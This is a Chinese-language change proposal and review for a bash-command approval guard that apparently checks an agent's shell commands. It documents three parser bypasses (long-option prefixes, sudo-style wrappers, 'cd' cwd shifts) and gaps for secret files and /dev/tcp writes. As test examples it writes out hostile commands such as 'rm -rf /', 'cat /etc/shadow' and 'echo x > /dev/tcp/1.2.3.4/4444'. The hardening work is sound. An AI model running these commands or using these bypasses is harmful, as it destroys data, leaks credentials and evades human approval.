## Why

第一轮安全审计（`bash-stage-a-security-fixes` / `bash-stage-b-security-fixes`）之后，静态探针与测试套件全绿，但二次深入审阅发现 bash-extract 的解析链仍有三处可利用的静默放行绕过（L1 长参数前缀、L2 外层包装器、L3 `cd` cwd 变更），以及决策层对系统机密路径（`/etc/shadow` 等）与网络外带路径（`/dev/tcp/*`）没有分层保护。这四类问题都已被实测复现（`node --experimental-strip-types` 直调 `extractBashTargets`），不是直觉推断。本 change 一次性封堵 P0 安全绕过与相邻的决策层保护缺口，不动降噪类工作（已在 TODO 池 backlog，独立 propose）。

## What Changes

**bash-extract 解析链加固（P0）**
- L1：`isShellForwarderTokenStream` 遇到 `bash --posix` / `bash --norc` 等长参数（`arg.startsWith("--")`）不再直接 `break` 返回 false，改为继续向后扫描以捕获 `-c` / 选项簇（`-xc` 等）/ 位置参数（脚本路径）。
- L2：`SHELL_WRAPPER_NAMES` 扩展，纳入 `sudo`、`nohup`、`timeout`、`watch`、`nice` 等常见外层包装器，使内层 `bash -c '...'` / `bash /tmp/x.sh` 被审查。
- L3：复合命令中出现 `cd` 时判整条命令为 `unreliable`（reason: `cd_chdir`），因为 `cd` 会改变后续命令的 cwd，静态分析无法预测相对路径的实际落点（如 `cd /etc && rm -rf .`）。

**决策层保护补齐（P1）**
- L4a：`sensitive.ts` 新增系统机密文件规则（`/etc/shadow`、`/etc/sudoers`、`/etc/master.passwd`、`/etc/crontab` 等），使外部读取不再落入"非敏感外部读自动放行"分支。
- L4b：`decision.ts` 对写入目标路径匹配 `/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` 时强制 tier=two（不提供"Always allow"），关闭 `/dev/tcp/1.2.3.4/4444` 被用户勾选持久化后无提示外带的通路。

**不动降噪类工作**（`for`-bounded-glob 只读循环静默、guardrails 文案对齐、`find -not -path` 冗余目标）——已在 TODO 池 backlog，独立 propose。

## Capabilities

### New Capabilities

（无）

### Modified Capabilities

- `bash-target-extraction`: 新增 shell-forwarder 的长参数前缀与外层包装器识别、`cd` 语义导致整条命令 unreliable 的判定规则。
- `access-decision`: 新增 `/dev/tcp`、`/dev/udp`、`/dev/fd/[0-9]+` 写入目标强制 tier=two 的决策规则；默认敏感规则表新增系统机密文件条目（`/etc/shadow` 等）。
- `approval-flow`: 新增 `cd_chdir` 作为 bash_reason 取值之一，其弹窗副文本按"命令无法静态解析、含 `cd` 改变 cwd 基准"分派（与既有 `glob_expansion` / `control_flow` / `shell_forwarder` / `forwarding_command` 并列）。
- `grant-memory`: 授权类型映射表将新 reason `cd_chdir` 显式并入 `read_write` 组（与 `shell_forwarder` / `forwarding_command` 同类——命令访问任意路径，属高风险）。

## Impact

- 代码：`src/lib/bash-extract.ts`（L1/L2/L3，解析链）、`src/lib/sensitive.ts`（L4a，规则表）、`src/lib/decision.ts`（L4b，决策分支）。
- 不动：`extensions/index.ts`（集成层不变）、`src/lib/config.ts`（冲突合并不变）、`src/lib/trust.ts`（授权存储不变）、`src/lib/audit.ts`（审计不变）。
- 测试：新增 `security-probe.mjs` 用例覆盖 L1/L2/L3 三类绕过；`test/sensitive.test.ts` 追加系统机密路径用例；`test/decision.test.ts` 追加 `/dev/tcp` 写入目标 tier=two 用例。
- 配置契约：无 JSONC 配置文件格式变更；无 trusted.json schema 变更。
- 用户影响：新增系统机密路径的读取会从"自动放行"变为"提示（tier=two，无持久化）"；`/dev/tcp` 写入目标会从"tier=three 可持久化"变为"tier=two 不可持久化"。这两类变化都是收窄授权范围，不引入新的静默放行。

## 系统工程影响评估

- **影响哪些分系统**：
  - `side-effects`（tier-small）：`bash-extract.ts` 加固（L1/L2/L3）+ `sensitive.ts` 规则表扩展（L4a）。
  - `policy-core`（tier-medium）：`decision.ts` 新增 dev-socket 写入目标的 tier=two 分支（L4b）。
  - `extension-orchestration`（tier-small）：不改动。
- **整体性能预期变化**：无行为变化以外的性能影响。`isShellForwarderTokenStream` 遇到长参数从"直接 return false"改为"继续向后扫描"，扫描长度与命令长度成正比，实测单条命令解析仍在毫秒级；`sensitive.ts` 新增 4-6 条 basename 前缀规则，线性扫描成本可忽略；`decision.ts` 新增分支在既有 `entry` / `sensitive` 检查之后，只影响 dev-socket 路径，非该路径零开销。
- **这是局部优化还是全局协调**：全局协调。四类修复点在权限系统的不同分系统（`bash-extract` 是命令解析器、`sensitive.ts` 是路径分类器、`decision.ts` 是决策引擎），任一处单独修复都会留下其他三处的绕过通路——这是"整体性能不等于各部分之和"的具体体现：只加固 `bash-extract` 而不动 `decision.ts`，`/dev/tcp` 外带仍可通过持久化授权绕过。
- **如果是局部优化，对全局失调的风险**：不适用（本次是全链路协调修复）。
- **预期行为模型**：
  - L1：`bash --posix -c 'rm -rf /'` 等长参数前缀命令 → 分类为 `unreliable`（reason: `shell_forwarder`），触发 tier=two 提示。
  - L2：`sudo bash -c 'rm -rf /'` 等外层包装器命令 → 分类为 `unreliable`（reason: `shell_forwarder`），触发 tier=two 提示。
  - L3：`cd /etc && rm -rf .` 等含 `cd` 的复合命令 → 分类为 `unreliable`（reason: `cd_chdir`），触发 tier=two 提示。
  - L4a：`cat /etc/shadow` 等系统机密文件读取 → 决策为 `prompt`（tier=two，敏感默认路径），无"Always allow"选项。
  - L4b：`echo x > /dev/tcp/1.2.3.4/4444` 等网络外带写入 → 决策为 `prompt`（tier=two），无"Always allow"选项。
  - 验证方式：`node --experimental-strip-types test/security-probe.mjs` 追加 L1/L2/L3 用例全部 `UNRL[...]` 且 reason 匹配；`npm test` 全绿（既有 538 通过 + 新增敏感路径与 dev-socket 用例通过）。
- **与既有架构/风格的遵循关系**：完全遵循。新增代码位于既有分系统（`bash-extract` / `sensitive` / `decision`）内，不引入新模块；沿用现有 `unreliable` 返回契约（reason 字符串）、现有 `SensitiveRule` 结构（test 函数 + reason）、现有 `Decision` discriminated union；错误处理与命名沿用既有模式（`scanUnreliable` / `scanControlFlow` / `isShellForwarderTokenStream` 的函数风格、`FIND_WRITE_FLAGS` / `SUBSTITUTION_READONLY_CMDS` 的常量集合命名）。**无偏离既有架构或风格**。

## caller impact 分析

- **变更点清单**：
  - ① `isShellForwarderTokenStream` 参数扫描循环逻辑修改（L1）—— **高危**（公共函数行为变更，caller 依赖其返回值判断 shell 转发器）。
  - ② `SHELL_WRAPPER_NAMES` 集合内容扩展（L2）—— **高危**（公共常量，caller 依赖其内容判定 wrapper 跳过）。
  - ③ `extractBashTargets` 新增 `cd` 语义检查分支（L3）—— **高危**（公共函数行为变更，caller 依赖其返回的 `ExtractResult`）。
  - ④ `DEFAULT_SENSITIVE_RULES` 数组新增条目（L4a）—— 常规（数组尾部追加，前向兼容；caller 依赖 `findSensitiveMatch` 返回值，非直接遍历数组）。
  - ⑤ `decision` 新增 dev-socket 写入 tier=two 分支（L4b）—— **高危**（公共函数返回值变更，caller 依赖 `Decision.kind` / `Decision.tier`）。
- **高危标记**：①②③⑤ 均涉及公共契约（`bash-extract.ts` 导出的函数与 `decision.ts` 导出的函数是 `extensions/index.ts` 与测试的唯一入口）。**go/no-go 决策点**：这些变更都是"收窄分类范围"（更多命令被判 unreliable / 更多路径被判敏感），不引入新的静默放行；不会破坏既有 caller 的调用契约（函数签名不变、返回值类型不变）。**判断：值得动公共契约**。
- **已知 caller**：
  - `extensions/index.ts:680` `findSensitiveMatch(absPath)` —— **兼容**（返回类型不变，只是更多路径会返回 truthy，decision 层会走 sensitive 分支而非 auto_allow 分支，符合预期）。
  - `extensions/index.ts:471` `extractBashTargets(command, state.projectRoot)` —— **兼容**（返回类型不变，只是更多命令被判 unreliable，走 tier=two 提示而非静默放行，符合预期）。
  - `extensions/index.ts:707` `decide({policy, absPath, projectRoot, action, isInside, sensitive})` —— **兼容**（参数签名不变，只是 dev-socket 写入目标会返回 tier=two 而非 tier=three，符合预期）。
  - `test/decision.test.ts:66` 测试辅助调用 —— **兼容**（测试辅助只消费 `sensitive` 返回值作为参数，不直接依赖其 truthy/falsy 的具体分类）。
  - `test/bash-extract.test.ts` —— **需适配**（可能有用例断言 `bash --posix -c` 类命令被静默放行，需检查并按新语义更新）。
  - `test/bash-extract.test.ts:599` / `test/bash-extract.test.ts:609`（BTP-audit-102）—— **需适配**：`cd /proj && npm test 2>&1 | grep -E ...` 现按 L3 新规则应判 `cd_chdir` unreliable，原断言 `reliable: true` 需改为 `reliable: false`；这是有意的 UX 收窄（"cd 改变 cwd 基准"），不是 bug。
  - `test/sensitive.test.ts` —— **需适配**（新增系统机密路径用例，追加而非修改既有用例）。
  - `test/security-probe.mjs` —— **需追加**（新增 L1/L2/L3 绕过 payload 用例，预期 reason 为 `shell_forwarder` / `cd_chdir`）。
  - `src/lib/bash-extract.ts:1723` `isAnyUnreliableCommand` —— **兼容但需知悉跨守卫传播**：`SHELL_WRAPPER_NAMES` 被 `isAnyUnreliableCommand` 与 `isShellForwarderTokenStream` 两个守卫共用；扩展集合会让 `sudo sed -i ...`、`sudo python3 ...` 等命令被识别为"外层 sudo 包装 + 内层 sed/python3"，内层命令命中 `UNRELIABLE_COMMANDS` 返回 true。方向上"收窄"符合安全目标，但作者须明确列出这一跨守卫影响，避免 apply 阶段意外引入 `unreliable_command` 断言变化。

## 实际系统工程影响 vs 预期（td-archive 步骤 3 强制复盘）

**tier：tier-medium（表 1：全部 5 字段必须填）**

| proposal 侧（预期） | archive 侧（实际） |
|---|---|
| 影响哪些分系统 | side-effects（tier-small）：`bash-extract.ts` L1/L2/L3 + `sensitive.ts` L4a；policy-core（tier-medium）：`decision.ts` L4b；extension-orchestration（tier-small）：`extensions/index.ts` cd_chdir 分支。实际全部落位，未波及未声明分系统。 |
| 整体性能预期变化 | 无行为变化以外的性能影响。实测 `isShellForwarderTokenStream` 遇到长参数 `continue` 再扫描，扫描长度与命令长度成正比，单条命令解析仍在毫秒级；`sensitive.ts` 新增 4–6 条 basename 前缀规则，线性扫描成本可忽略；`decision.ts` 新增分支在既有 `entry`/`sensitive` 检查之后，非 dev-socket 路径零开销。与预期一致。 |
| 这是局部优化还是全局协调 | 全局协调。四类修复点分布在权限系统不同分系统，任一处单独修复都会留下其他三处的绕过通路。事后验证：`cat /etc/shadow > /dev/tcp/...`、`sudo bash --posix -c '...'`、`cd /etc && echo x > /dev/tcp/...` 三类复合边界的跨分系统判定顺序（见 `test/cross-system-boundary.mjs` 8 项 check 全绿），L3 vs L2 / shell_forwarder vs cd_chdir reason 优先级无冲突，L4a 与 L4b 的 tier=two 分配独立互不干扰。 |
| 如果是局部优化，对全局失调的风险 | 不适用（本次是全链路协调修复）。 |
| 预期行为模型 | 5 条（L1–L4b）全部验证通过，模型成立：**记录「预期行为模型已验证」**。具体：L1/L2 探针 `UNRL[shell_forwarder]`、L3 探针 `UNRL[cd_chdir]`、`findSensitiveMatch("/etc/shadow")` 返回 `System credential/config file`、`decide("/dev/tcp/...", write)` 返回 `prompt` / `tier=two`。`npm test` 551/0、`security-probe` 55/0、跨系统边界 8/8 全绿。 |

**补充字段：**

- **预期之外的副作用**：无新增静默放行（按 caller impact 节判断）。一个已知行为收窄：含 `cd` 的合法复合命令（如 `cd src && ls`）会触发 tier=two 提示，这是有意的 UX 收窄而非 bug。`BTP-audit-102` 用例按新语义更新（`reliable: true` → `cd_chdir` unreliable），已在 caller impact 节标注。
- **scenario→test 覆盖账本状态**：35 个 scenario 全部映射到具名测试。3 个原 N/A 条目（AF-CDC-01、AF-CDC-02、GM-CDC-01）已在步骤 6.3 转为可执行测试面（`test/approval-flow.test.ts`、`test/grant-memory.test.ts`），`npm test` 含新增 3 个 test 全绿。

